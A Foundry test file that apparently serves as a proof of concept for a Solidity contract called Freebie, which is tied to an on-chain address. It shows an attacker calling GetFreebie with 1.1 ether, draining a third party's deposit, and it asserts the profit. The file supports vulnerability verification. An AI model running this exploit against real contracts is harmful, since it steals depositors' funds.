// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol";

contract FreebieTest is Test {
    Freebie freebie;
    address payable attacker;
    address depositor = makeAddr("depositor");
    uint256 initialAttackerBalance = 100 ether;
    uint256 initialDeposit = 5 ether;
    uint256 attackAmount = 1.1 ether;
    
    function setUp() public {
        attacker = payable(address(uint160(uint256(keccak256("attacker")))));
        vm.deal(attacker, initialAttackerBalance);
        vm.deal(depositor, initialDeposit);

        // Attacker deploys contract to become Owner
        vm.prank(attacker);
        freebie = new Freebie();

        // Third party deposits to contract
        vm.prank(depositor);
        payable(address(freebie)).transfer(initialDeposit);
    }

    function test_freebie_drains_contract_balance() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(freebie).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        uint256 totalFreebiesBefore = freebie.totalFreebies();
        uint256 attackerFreebiesBefore = freebie.userFreebies(attacker);

        console.log("Contract balance: %s", contractBalanceBefore);
        console.log("Attacker balance: %s", attackerBalanceBefore);
        console.log("Total freebies: %s", totalFreebiesBefore);
        console.log("Attacker freebies: %s", attackerFreebiesBefore);

        console.log("--- Trigger GetFreebie ---");
        // Attacker exploits the vulnerability
        vm.prank(attacker, attacker);
        freebie.GetFreebie{value: attackAmount}();
        
        console.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(freebie).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 totalFreebiesAfter = freebie.totalFreebies();
        uint256 attackerFreebiesAfter = freebie.userFreebies(attacker);

        console.log("Contract balance: %s", contractBalanceAfter);
        console.log("Attacker balance: %s", attackerBalanceAfter);
        console.log("Total freebies: %s", totalFreebiesAfter);
        console.log("Attacker freebies: %s", attackerFreebiesAfter);

        // Verify results
        assertEq(
            contractBalanceAfter,
            0,
            "Contract balance should be drained"
        );
        assertEq(
            attackerBalanceAfter,
            initialAttackerBalance + initialDeposit,
            "Attacker should profit from the contract"
        );
        
        console.log("--- DIFFERENTIAL RESULTS ---");
        bool contractDrained = contractBalanceAfter == 0;
        bool attackerProfited = attackerBalanceAfter == attackerBalanceBefore + contractBalanceBefore;
        bool freebieCountIncreased = totalFreebiesAfter > totalFreebiesBefore;
        bool attackerFreebieIncreased = attackerFreebiesAfter > attackerFreebiesBefore;
        
        console.log("Contract drained: %s", contractDrained ? "YES" : "NO");
        console.log("Attacker profited: %s", attackerProfited ? "YES" : "NO");
        console.log("Freebie count increased: %s", freebieCountIncreased ? "YES" : "NO");
        console.log("Attacker freebie record increased: %s", attackerFreebieIncreased ? "YES" : "NO");

        // Final vulnerability verdict
        if(
            contractDrained &&
            attackerProfited &&
            freebieCountIncreased &&
            attackerFreebieIncreased
        ) {
            console.log("Vulnerability Exists: Attack successfully drained contract balance, transferred funds to attacker, and increased freebie records");
        } else {
            console.log("Vulnerability not Exist: State changes do not indicate successful exploitation");
        }
    }
}